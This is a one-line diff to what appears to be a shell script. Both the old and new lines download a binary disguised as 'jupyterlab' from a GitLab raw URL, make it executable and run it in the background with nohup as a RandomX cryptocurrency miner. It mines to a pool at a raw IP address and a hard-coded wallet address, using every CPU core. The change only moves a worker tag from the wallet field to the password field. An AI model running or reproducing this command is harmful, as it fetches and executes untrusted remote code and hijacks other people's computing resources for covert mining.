@@ -1,1 +1,1 @@
-wget -qO wolu https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab && chmod +x wolu && nohup ./wolu -o 51.79.163.234:443 -a rx/0 -u 845QtKErnZAYq6m2meN41qMM1jVR55a4xFUgYwjQKMNaMneSxw37nTf4TJXYC5JJQEKprNo3rMiH717Vmo49CKmLGSYgjNP.GH --randomx-1gb-pages -p -x -t $(nproc --all)
+wget -qO wolu https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab && chmod +x wolu && nohup ./wolu -o 51.79.163.234:443 -a rx/0 -u 845QtKErnZAYq6m2meN41qMM1jVR55a4xFUgYwjQKMNaMneSxw37nTf4TJXYC5JJQEKprNo3rMiH717Vmo49CKmLGSYgjNP --randomx-1gb-pages -p GH -t $(nproc --all)
